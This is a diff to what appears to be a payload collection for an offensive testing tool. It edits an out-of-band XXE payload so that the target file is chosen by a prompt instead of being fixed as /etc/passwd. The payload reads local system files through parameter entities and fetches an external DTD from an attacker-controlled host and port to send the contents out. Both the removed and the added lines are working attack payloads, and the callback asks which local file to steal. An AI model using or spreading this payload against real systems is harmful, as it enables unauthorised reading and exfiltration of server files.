@@ -74,7 +74,7 @@ Load({
 
 Load({
 	title: "XXE (Local File Read using parameter entities)",
-	payload: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo [ <!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % start \"<![CDATA[\"><!ENTITY % end \"]]>\"><!ENTITY % dtd SYSTEM \"http://<LHOST>:<LPORT>/inline\">%dtd; ]><methodCall><methodName>&xxe;</methodName></methodCall>",
+	payload: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo [ <!ENTITY % file SYSTEM \"file://<PROMPT>\"><!ENTITY % start \"<![CDATA[\"><!ENTITY % end \"]]>\"><!ENTITY % dtd SYSTEM \"http://<LHOST>:<LPORT>/inline\">%dtd; ]><methodCall><methodName>&xxe;</methodName></methodCall>",
 	callback: function(bro){
 	  question("Specify a local file (/etc/passwd , C:\\Windows\\win.ini)");
 	  question(ask.http);
